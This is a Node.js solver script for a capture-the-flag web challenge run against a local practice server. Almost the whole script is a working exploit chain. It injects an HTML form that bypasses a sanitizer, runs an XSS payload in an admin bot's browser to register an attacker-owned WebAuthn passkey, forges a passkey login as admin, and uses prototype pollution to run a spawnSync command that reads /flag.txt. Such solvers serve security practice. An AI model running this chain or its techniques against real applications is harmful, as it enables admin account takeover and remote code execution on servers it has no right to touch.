#!/usr/bin/env node
// Automated solver for the "fallback" web challenge (local practice copy).
//
// Chain:
//   1. Register a normal user, create an incident whose body injects a
//      <form name="reviewConfig"><input name="assetUrl" value="data:...">
//      (bypasses the weak HTML sanitizer -- no <script>/on* needed).
//   2. Ask the admin bot to review that incident. review-loader.js reads the
//      injected form and loads our data: URL as a script in the admin origin.
//   3. That script registers an attacker-controlled WebAuthn passkey for the
//      admin account (the server never verifies attestation).
//   4. We sign an assertion with our private key, log in as admin via passkey
//      (auth_level=passkey => elevated), import a report profile whose
//      compatPatch pollutes Object.prototype.postRenderFormula, then render
//      it. runPostRender() does new Function(...) with `process`/`Bun` in
//      scope, so our formula reads /flag.txt.
//
// Usage: node solve.mjs   (server must be on http://127.0.0.1:3000)

import crypto from "node:crypto";

const TARGET = process.env.TARGET || "http://127.0.0.1:3000";
const ORIGIN = "http://127.0.0.1:3000"; // must match server APP_ORIGIN
const RPID = "127.0.0.1";
const ADMIN_USER = "admin";
const USER = "attacker_" + crypto.randomBytes(3).toString("hex");
const PASS = "Passw0rd!";

const jar = new Map();
const b64url = (b) => Buffer.from(b).toString("base64url");
const sha256 = (d) => crypto.createHash("sha256").update(d).digest();

function cookieHeader() {
  return [...jar.entries()].map(([k, v]) => `${k}=${v}`).join("; ");
}

async function req(path, opts = {}) {
  opts.headers = Object.assign({}, opts.headers || {});
  opts.redirect = opts.redirect || "manual";
  const ck = cookieHeader();
  if (ck) opts.headers["Cookie"] = ck;
  const res = await fetch(TARGET + path, opts);
  const sc = res.headers.getSetCookie ? res.headers.getSetCookie() : [];
  for (const c of sc) {
    const pair = c.split(";")[0];
    const i = pair.indexOf("=");
    jar.set(pair.slice(0, i), pair.slice(i + 1));
  }
  return res;
}

function authData(flags, signCount = 0) {
  const b = Buffer.alloc(37);
  sha256(RPID).copy(b, 0);
  b[32] = flags;
  b.writeUInt32BE(signCount, 33);
  return b;
}

function clientDataJSON(type, challenge) {
  return Buffer.from(JSON.stringify({ type, challenge, origin: ORIGIN }));
}

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

async function main() {
  // --- attacker keypair -----------------------------------------------------
  const { publicKey, privateKey } = crypto.generateKeyPairSync("ec", { namedCurve: "prime256v1" });
  const spki = b64url(publicKey.export({ type: "spki", format: "der" }));
  const credId = b64url(crypto.randomBytes(16));

  // --- script that will run in the admin browser ---------------------------
  const xssJs = `
(async () => {
  const b64url = (buf) => btoa(String.fromCharCode(...new Uint8Array(buf))).replace(/\\+/g,'-').replace(/\\//g,'_').replace(/=+$/,'');
  const sha256 = (s) => crypto.subtle.digest('SHA-256', new TextEncoder().encode(s));
  try {
    const r = await fetch('/api/passkeys/register/options').then(r => r.json());
    const ad = new Uint8Array(37);
    ad.set(new Uint8Array(await sha256(location.hostname)), 0);
    ad[32] = 0x41; // UP | AT
    const body = {
      id: ${JSON.stringify(credId)},
      challengeId: r.challengeId,
      response: {
        clientDataJSON: b64url(new TextEncoder().encode(JSON.stringify({ type: 'webauthn.create', challenge: r.publicKey.challenge, origin: location.origin }))),
        authenticatorData: b64url(ad),
        publicKey: ${JSON.stringify(spki)},
        transports: []
      }
    };
    await fetch('/api/passkeys/register/verify', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) });
  } catch (e) {}
})();
`;

  const dataUrl = "data:text/javascript;base64," + Buffer.from(xssJs).toString("base64");
  const incidentBody = `<form name="reviewConfig"><input name="assetUrl" value="${dataUrl}"></form>`;

  // --- 1. register + create incident ---------------------------------------
  let res = await req("/register", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: new URLSearchParams({ username: USER, email: USER + "@x.tld", password: PASS })
  });
  if (!res.ok && res.status !== 302) console.error("[!] register:", res.status);

  res = await req("/api/incidents", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: new URLSearchParams({ title: "review me", body: incidentBody, queue: "personal" })
  });
  const { incidentId } = await res.json();
  console.log("[+] incident:", incidentId);

  // --- 2. trigger admin bot ------------------------------------------------
  await req("/bot/visit", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: new URLSearchParams({ incidentId: String(incidentId) })
  });
  console.log("[*] waiting for bot to register the passkey...");
  await sleep(9000);

  // --- 3. login as admin via passkey --------------------------------------
  const lo = await (await req(`/api/passkeys/login/options?username=${ADMIN_USER}`)).json();
  if (!lo.publicKey) throw new Error("no login options (passkey not registered?)");
  const cd = clientDataJSON("webauthn.get", lo.publicKey.challenge);
  const ad = authData(0x01);
  const data = Buffer.concat([ad, sha256(cd)]);
  const signature = b64url(crypto.sign("sha256", data, privateKey));
  const loginRes = await req("/api/passkeys/login/verify", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      id: credId,
      challengeId: lo.challengeId,
      response: { clientDataJSON: b64url(cd), authenticatorData: b64url(ad), signature }
    })
  });
  if (!loginRes.ok) throw new Error("passkey login failed: " + loginRes.status);
  console.log("[+] logged in as admin (elevated)");

  // --- 4. prototype pollution -> RCE -> flag ------------------------------
  const compatKey = "%5f%5fproto%5f%5f.postRenderFormula";
  const hook = 'return Bun.spawnSync(["cat","/flag.txt"]).stdout.toString()';
  const imp = await req("/api/admin/report-profiles/import", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      name: "pwn",
      config: { title: "pwn", rows: ["a"], formatter: "table" },
      compatPatch: { [compatKey]: hook }
    })
  });
  const { reportId } = await imp.json();
  console.log("[+] reportId:", reportId);

  const html = await (await req(`/admin/reports/${reportId}/render`)).text();
  const flag = (html.match(/PLAYIT\{[^}]*\}/) || [])[0];
  console.log(flag ? `[FLAG] ${flag}` : "[!] flag not found:\n" + html.slice(0, 500));
}

main().catch((e) => {
  console.error(e);
  process.exit(1);
});
